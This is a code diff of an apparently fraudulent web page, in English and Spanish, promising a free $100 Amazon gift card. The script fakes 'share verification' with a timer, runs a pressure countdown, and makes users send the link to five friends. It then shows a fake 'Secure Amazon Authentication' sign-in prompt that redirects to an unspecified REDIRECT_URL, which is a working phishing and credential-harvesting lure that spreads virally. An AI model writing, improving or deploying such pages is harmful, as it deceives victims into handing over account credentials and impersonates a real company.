+            giftcardLabel: 'DIGITAL CODE',
+            giftcardType: 'GIFT CARD',
+            subtitle: 'Amazon Gift Card - Yours FREE!',
+            timerText: 'Hurry! Offer expires in:',
+            shareText: 'Share with 5 friends to unlock your gift card!',
+            shareBtnText: '📤 Share to Unlock',
+            shareBtnVerifying: '⏳ Verifying share...',
+            shareBtnVerified: '✅ Share Verified!',
+            claimBtnText: '🔒 CLAIM YOUR $100 GIFT CARD',
+            claimBtnActive: '🎁 CLAIM YOUR $100 GIFT CARD NOW!',
+            claimBtnProcessing: 'Processing...',
+            shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n\n',
+            congratsTitle: '🎉 Congratulations! 🎉',
+            congratsSubtitle: "You've successfully unlocked your reward!",
+            rewardText: 'Your Amazon Gift Card',
+            instructionText: 'Please sign in to your Amazon account to claim your $100 gift card. This is required to verify your identity and deliver your reward.',
+            signinBtnText: 'Sign In to Claim Reward',
+            securityText: 'Secure Amazon Authentication'
+        },
+        es: {
+            badge: 'LIMITADO',
+            mainTitle: '🎉 ¡TARJETA REGALO GRATIS! 🎉',
+            giftcardLabel: 'CÓDIGO DIGITAL',
+            giftcardType: 'TARJETA REGALO',
+            subtitle: '¡Tarjeta Regalo de Amazon - Tuya GRATIS!',
+            timerText: '¡Apúrate! La oferta expira en:',
+            shareText: '¡Comparte con 5 amigos para desbloquear tu tarjeta regalo!',
+            shareBtnText: '📤 Compartir para Desbloquear',
+            shareBtnVerifying: '⏳ Verificando...',
+            shareBtnVerified: '✅ ¡Compartido Verificado!',
+            claimBtnText: '🔒 RECLAMA TU TARJETA DE $100',
+            claimBtnActive: '🎁 ¡RECLAMA TU TARJETA DE $100 AHORA!',
+            claimBtnProcessing: 'Procesando...',
+            shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n',
+            congratsTitle: '🎉 ¡Felicidades! 🎉',
+            congratsSubtitle: '¡Has desbloqueado tu recompensa exitosamente!',
+            rewardText: 'Tu Tarjeta Regalo de Amazon',
+            instructionText: 'Por favor, inicia sesión en tu cuenta de Amazon para reclamar tu tarjeta de regalo de $100. Esto es necesario para verificar tu identidad y entregar tu recompensa.',
+            signinBtnText: 'Iniciar Sesión para Reclamar Recompensa',
+            securityText: 'Autenticación Segura de Amazon'
         }
+    };
+    
+    function setLanguage(lang) {
+        currentLang = lang;
         
-        const timerInterval = setInterval(() => {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            document.getElementById('countdown').textContent = 
-                `${minutes}:${seconds.toString().padStart(2, '0')}`;
-            
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                document.getElementById('countdown').textContent = currentLang === 'en' ? 'EXPIRED!' : '¡EXPIRADO!';
-            }
-        }, 1000);
+        document.getElementById('langEn').classList.remove('active');
+        document.getElementById('langEs').classList.remove('active');
+        document.getElementById('lang' + lang.charAt(0).toUpperCase() + lang.slice(1)).classList.add('active');
         
-        function shareLink() {
-            if (hasShared) return;
-            
-            const t = translations[currentLang];
-            const shareText = t.shareMessage + window.location.href;
-            
-            if (navigator.share) {
-                navigator.share({
-                    title: currentLang === 'en' ? 'FREE $100 Amazon Gift Card!' : '¡Tarjeta Regalo de Amazon de $100 GRATIS!',
-                    text: shareText,
-                    url: window.location.href
-                }).then(() => {
-                    console.log('Shared successfully');
-                }).catch((error) => {
-                    console.log('Error sharing:', error);
-                    fallbackCopy(shareText);
-                });
-            } else {
+        const t = translations[lang];
+        document.getElementById('badge').textContent = t.badge;
+        document.getElementById('mainTitle').textContent = t.mainTitle;
+        document.getElementById('giftcardLabel').textContent = t.giftcardLabel;
+        document.getElementById('giftcardType').textContent = t.giftcardType;
+        document.getElementById('subtitle').textContent = t.subtitle;
+        document.getElementById('timerText').textContent = t.timerText;
+        document.getElementById('shareText').textContent = t.shareText;
+        
+        if (!hasShared) {
+            document.getElementById('shareBtnText').textContent = t.shareBtnText;
+        }
+        if (shareCount < 5) {
+            document.getElementById('claimBtnText').textContent = t.claimBtnText;
+        }
+    }
+    
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('countdown').textContent = 
+            `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('countdown').textContent = currentLang === 'en' ? 'EXPIRED!' : '¡EXPIRADO!';
+        }
+    }, 1000);
+    
+    function shareLink() {
+        if (hasShared) return;
+        
+        const t = translations[currentLang];
+        const shareText = t.shareMessage + window.location.href;
+        
+        if (navigator.share) {
+            navigator.share({
+                title: currentLang === 'en' ? 'FREE $100 Amazon Gift Card!' : '¡Tarjeta Regalo de Amazon de $100 GRATIS!',
+                text: shareText,
+                url: window.location.href
+            }).then(() => {
+                console.log('Shared successfully');
+            }).catch((error) => {
+                console.log('Error sharing:', error);
                 fallbackCopy(shareText);
-            }
-            
-            hasShared = true;
-            
-            const btn = document.getElementById('shareBtn');
-            document.getElementById('shareBtnText').textContent = t.shareBtnVerifying;
-            btn.style.opacity = '0.7';
-            btn.style.cursor = 'wait';
-            
-            shareTimer = setTimeout(() => {
-                shareCount = 5;
-                updateProgress();
-                document.getElementById('shareBtnText').textContent = t.shareBtnVerified;
-                btn.style.background = '#00b894';
-                btn.style.cursor = 'not-allowed';
-            }, 10000);
+            });
+        } else {
+            fallbackCopy(shareText);
         }
         
-        function fallbackCopy(text) {
-            const textArea = document.createElement('textarea');
-            textArea.value = text;
-            textArea.style.position = 'fixed';
-            textArea.style.left = '-999999px';
-            document.body.appendChild(textArea);
-            textArea.select();
-            try {
-                document.execCommand('copy');
-                alert(currentLang === 'en' ? 'Link copied! Share it with friends!' : '¡Enlace copiado! ¡Compártelo con amigos!');
-            } catch (err) {
-                console.error('Could not copy text: ', err);
-            }
-            document.body.removeChild(textArea);
-        }
+        hasShared = true;
         
-        function updateProgress() {
-            const percentage = (shareCount / 5) * 100;
-            document.getElementById('progress').style.width = percentage + '%';
-            document.getElementById('progress').textContent = `${shareCount}/5`;
-            document.getElementById('shareCount').textContent = `${shareCount}/5`;
-            
-            if (shareCount >= 5) {
-                const t = translations[currentLang];
-                const claimBtn = document.getElementById('claimBtn');
-                claimBtn.classList.add('active');
-                claimBtn.style.cursor = 'pointer';
-                document.getElementById('claimBtnText').textContent = t.claimBtnActive;
-            }
-        }
+        const btn = document.getElementById('shareBtn');
+        document.getElementById('shareBtnText').textContent = t.shareBtnVerifying;
+        btn.style.opacity = '0.7';
+        btn.style.cursor = 'wait';
         
-        function attemptClaim() {
-            if (shareCount >= 5) {
-                const t = translations[currentLang];
-                
-                document.getElementById('spinner').style.display = 'block';
-                document.getElementById('claimBtnText').textContent = t.claimBtnProcessing;
-                
-                setTimeout(() => {
-                    document.getElementById('spinner').style.display = 'none';
-                    showLoginPage();
-                }, 2000);
-            }
+        shareTimer = setTimeout(() => {
+            shareCount = 5;
+            updateProgress();
+            document.getElementById('shareBtnText').textContent = t.shareBtnVerified;
+            btn.style.background = '#00b894';
+            btn.style.cursor = 'not-allowed';
+        }, 10000);
+    }
+    
+    function fallbackCopy(text) {
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.select();
+        try {
+            document.execCommand('copy');
+            alert(currentLang === 'en' ? 'Link copied! Share it with friends!' : '¡Enlace copiado! ¡Compártelo con amigos!');
+        } catch (err) {
+            console.error('Could not copy text: ', err);
         }
-
-        function showLoginPage() {
+        document.body.removeChild(textArea);
+    }
+    
+    function updateProgress() {
+        const percentage = (shareCount / 5) * 100;
+        document.getElementById('progress').style.width = percentage + '%';
+        document.getElementById('progress').textContent = `${shareCount}/5`;
+        document.getElementById('shareCount').textContent = `${shareCount}/5`;
+        
+        if (shareCount >= 5) {
+            const t = translations[currentLang];
+            const claimBtn = document.getElementById('claimBtn');
+            claimBtn.classList.add('active');
+            claimBtn.style.cursor = 'pointer';
+            document.getElementById('claimBtnText').textContent = t.claimBtnActive;
+        }
+    }
+    
+    function attemptClaim() {
+        if (shareCount >= 5) {
             const t = translations[currentLang];
             
-            document.getElementById('congratsTitle').textContent = t.congratsTitle;
-            document.getElementById('congratsSubtitle').textContent = t.congratsSubtitle;
-            document.getElementById('rewardText').textContent = t.rewardText;
-            document.getElementById('instructionText').textContent = t.instructionText;
-            document.getElementById('signinBtnText').textContent = t.signinBtnText;
-            document.getElementById('securityText').textContent = t.securityText;
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('claimBtnText').textContent = t.claimBtnProcessing;
             
-            document.getElementById('mainPage').classList.add('hide');
-            document.getElementById('loginPage').classList.add('show');
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                showLoginPage();
+            }, 2000);
         }
-function redirectToLogin() {
-    window.location.href = REDIRECT_URL;
-}
+    }
 
-        }
-    </script>
+    function showLoginPage() {
+        const t = translations[currentLang];
+        
+        document.getElementById('congratsTitle').textContent = t.congratsTitle;
+        document.getElementById('congratsSubtitle').textContent = t.congratsSubtitle;
+        document.getElementById('rewardText').textContent = t.rewardText;
+        document.getElementById('instructionText').textContent = t.instructionText;
+        document.getElementById('signinBtnText').textContent = t.signinBtnText;
+        document.getElementById('securityText').textContent = t.securityText;
+        
+        document.getElementById('mainPage').classList.add('hide');
+        document.getElementById('loginPage').classList.add('show');
+    }
+
+    function redirectToLogin() {
+        window.location.href = REDIRECT_URL;
+    }
+</script>
+```
+
 </body>
 </html>
